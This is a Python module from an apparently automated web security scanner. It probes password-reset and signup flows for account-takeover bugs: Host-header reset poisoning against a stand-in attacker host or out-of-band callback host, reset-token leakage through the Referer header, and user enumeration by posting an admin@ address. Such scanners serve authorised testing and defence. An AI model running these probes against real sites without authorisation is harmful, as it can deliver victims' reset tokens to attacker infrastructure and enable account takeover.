"""Account-takeover playbook — the auth-flow bugs that pay.

Self-filters to authentication-flow URLs (forgot/reset/confirm/verify/register)
and runs the classic ATO primitives:

  1. **Password-reset poisoning** — inject `Host` / `X-Forwarded-Host` /
     `Forwarded` pointing at an **OOB callback host** and see if the application
     reflects it (the reset link is then built against attacker infrastructure →
     the victim's token lands on the attacker). Two proof channels: in-band host
     *reflection* (instant, verified), and — since the poisoned host is a live
     OOB token — a *callback* if the mailer / link-preview / origin fetches it,
     which upgrades the otherwise-blind case to captured proof at finalize.
     Read-only host-reflection probe always runs; the actual reset-email
     submission is gated behind `--aggressive`.
  2. **Reset-token leakage** — token present in the URL *and* the page loads
     third-party resources → the token leaks to those origins via `Referer`.
  3. **User enumeration** — reset endpoint distinguishes existing vs unknown
     accounts (aids targeted takeover).

Findings are conservative: blind cases are reported as needing manual
confirmation of the email link.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING
from urllib.parse import urlparse, parse_qsl

from core.utils import host_of, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

FLOW_RE = re.compile(r"(forgot|reset|recover|password|confirm|verify|activate|"
                     r"register|signup|sign-up|magic|otp)", re.I)
RESET_FLOW_RE = re.compile(r"(forgot|reset|recover|password|magic|recover)", re.I)
TOKEN_PARAM_RE = re.compile(r"(token|reset|code|key|confirm|activation|t|otp)", re.I)
EVIL = "attacker.samaritanx.test"
THIRD_PARTY_RES_RE = re.compile(r"""<(?:script|img|link|iframe)[^>]+(?:src|href)=["']https?://([^/"']+)""", re.I)


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    if not FLOW_RE.search(url):
        return []
    findings: list[dict] = []
    aggressive = bool(ctx.config.get("safety", {}).get("aggressive"))

    findings.extend(await _host_header_poisoning(ctx, url, form, aggressive))
    findings.extend(await _token_referer_leak(ctx, url))
    findings.extend(await _user_enumeration(ctx, url, form))
    return findings


async def _host_header_poisoning(ctx, url, form, aggressive):
    findings: list[dict] = []

    # Point the poisoned host at a live OOB token when available: reflection is
    # still detected (unique token in the body/location), and if the mailer or a
    # link-preview later fetches the reset link, the callback lands on our token
    # and `oob.pending_findings()` upgrades the blind case to captured proof.
    oob_token = None
    evil = EVIL
    if getattr(ctx, "oob", None) and ctx.oob.registered:
        oob_token = ctx.oob.token()
        evil = ctx.oob.host_for(oob_token)
    poisoned = {"Host": evil, "X-Forwarded-Host": evil,
                "X-Forwarded-Server": evil, "Forwarded": f"host={evil}"}
    if oob_token:
        ctx.oob.register(oob_token, {
            "category": "account_takeover",
            "title": f"Account takeover — password-reset poisoning ({urlparse(url).path})",
            "severity": "critical", "cvss": 9.1,
            "url": url, "parameter": "Host/X-Forwarded-Host", "payload": evil,
            "evidence": "A password-reset flow built its link against an attacker-supplied Host "
                        "header and something fetched that host out-of-band — the victim's reset "
                        "token is delivered to attacker infrastructure → account takeover.",
            "_detection": "host_oob_callback", "_method": "POST",
            "_request": f"POST {url}\nHost: {evil}", "_oob_ref": evil,
        })

    # read-only: does the page reflect an attacker-controlled host?
    ev = await ctx.http.get(url, headers=poisoned)
    reflected = evil in (ev.response_body or "") or evil in ev.response_headers.get("location", "")
    if reflected:
        findings.append(_finding(
            url, "Host/X-Forwarded-Host", "high", 8.1,
            "Application reflected an attacker-supplied Host header into its response. "
            "On a password-reset flow the reset link is built from this host, so the "
            "victim's reset token is delivered to attacker infrastructure → account takeover.",
            detection="host_reflection",
            poc=_reflection_poc(url, evil, ev, "GET")))
        return findings

    # active: submit the reset with a poisoned host (sends an email) — aggressive only
    if aggressive and RESET_FLOW_RE.search(url):
        data = _reset_payload(form)
        if data:
            ev = await ctx.http.request("POST", url, data=data, headers=poisoned)
            body = ev.response_body or ""
            if evil in body:
                findings.append(_finding(
                    url, "Host (reset submit)", "high", 8.3,
                    f"Reset submission reflected attacker host `{evil}` — poisoned reset link confirmed.",
                    detection="host_reflection_post",
                    poc=_reflection_poc(url, evil, ev, "POST")))
            elif ev.status in (200, 201, 202):
                # Blind: the reset was accepted with our host injected. If it was
                # an OOB host, a late callback (mailer/link-preview) turns this
                # into a verified finding via oob.pending_findings() at finalize.
                extra = (" A live OOB host was injected — a captured callback will confirm this "
                         "automatically." if oob_token else
                         " Manually confirm the link domain in the received email.")
                findings.append(_finding(
                    url, "Host (reset submit)", "medium", 6.1,
                    "Reset request accepted with an injected Host header. Reset email could not be "
                    "observed in-band." + extra,
                    detection="host_blind"))
                if oob_token:
                    await ctx.oob.check(oob_token, wait=2.0)
    return findings


def _reflection_poc(url, evil, ev, method):
    """A verified PoC record for the in-band reflection case (the host we sent
    came back in the response — reproducible, no manual step)."""
    from core.poc import proof_record
    body = ev.response_body or ""
    return proof_record(
        verified=True, method=method, url=url,
        request=f"{method} {url}\nHost: {evil}",
        status=ev.status, excerpt=body,
        rationale=f"The attacker-controlled host `{evil}` was reflected back in the "
                  f"{'Location header' if evil in ev.response_headers.get('location', '') else 'response body'}, "
                  "so a password-reset link would be built against it.")


async def _token_referer_leak(ctx, url):
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    token_keys = [k for k in q if TOKEN_PARAM_RE.fullmatch(k)]
    if not token_keys:
        return []
    ev = await ctx.http.get(url)
    third = {h for h in THIRD_PARTY_RES_RE.findall(ev.response_body or "")
             if host_of("https://" + h) and h.split(":")[0] != urlparse(url).netloc}
    if third:
        return [_finding(
            url, ",".join(token_keys), "high", 7.4,
            f"Reset/confirm token is carried in the URL ({token_keys}) and the page loads "
            f"third-party resources ({sorted(third)[:4]}). The token leaks to those origins "
            "via the Referer header → account takeover.",
            detection="referer_leak")]
    return []


async def _user_enumeration(ctx, url, form):
    if not RESET_FLOW_RE.search(url):
        return []
    # POSTing to the reset flow actually emails the account — destructive on
    # real targets, so it is gated behind --aggressive like the reset-submit.
    if not ctx.config.get("safety", {}).get("aggressive"):
        return []
    field = _email_field(form) or "email"
    real = {field: "admin@" + host_of(url).split(":")[0]}
    fake = {field: f"{random_token(10)}@{random_token(8)}.invalid"}
    ev_r = await ctx.http.request("POST", url, data=real)
    ev_f = await ctx.http.request("POST", url, data=fake)
    if ev_r.status and ev_r.status == ev_f.status:
        a, b = ev_r.response_body or "", ev_f.response_body or ""
        if a and b and abs(len(a) - len(b)) > max(120, int(0.25 * max(len(a), 1))):
            return [_finding(
                url, field, "low", 4.3,
                f"Reset endpoint returns materially different responses for a known vs unknown "
                f"account ({len(a)}B vs {len(b)}B) — user enumeration aids targeted takeover.",
                detection="user_enum")]
    return []


def _reset_payload(form):
    field = _email_field(form)
    if field:
        return {field: "victim@" + random_token(6) + ".test"}
    return {"email": "victim@" + random_token(6) + ".test"}


def _email_field(form):
    for i in (form or {}).get("inputs", []):
        name = (i.get("name") or "").lower()
        if name in ("email", "username", "user", "login", "account"):
            return i["name"]
    return None


def _finding(url, param, sev, cvss, evidence, *, detection, poc=None):
    meta = {"detection": detection}
    if poc is not None:
        meta["poc"] = poc
    return {
        "category": "account_takeover",
        "title": f"Account takeover — {detection.replace('_', ' ')} ({urlparse(url).path})",
        "severity": sev, "cvss": cvss,
        "url": url, "parameter": param, "evidence": evidence,
        "request": f"GET/POST {url}",
        "metadata": meta,
    }
